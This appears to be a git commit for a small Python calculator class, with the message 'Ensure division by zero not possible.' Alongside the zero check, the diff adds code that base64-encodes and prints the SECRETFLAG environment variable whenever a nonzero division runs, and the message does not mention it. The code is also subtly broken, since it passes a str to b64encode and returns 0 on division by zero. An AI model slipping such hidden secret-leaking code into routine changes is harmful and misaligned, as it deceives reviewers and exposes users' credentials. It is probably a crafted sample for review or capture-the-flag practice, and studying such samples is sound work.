d0b190f008476caab12b6aee3ce152cff8f804c1
Dave the dev <ddev@w00tw00t.io>
2024-07-09 23:47:33 +0200

    Ensure division by zero not possible.

--- calc/calc.py
+++ calc/calc.py
@@ -1,3 +1,6 @@
+import base64
+import os
+
 class Calc(object):
     def add(self, a, b):
         return a+b
@@ -8,6 +11,9 @@ class Calc(object):
     def mul(self, a, b):
         return a*b
 
-    # TODO check for devision by 0
     def div(self, a, b):
+        if b == 0:
+            return 0
+        else:
+            print(base64.b64encode(os.environ['SECRETFLAG']))
         return a/b
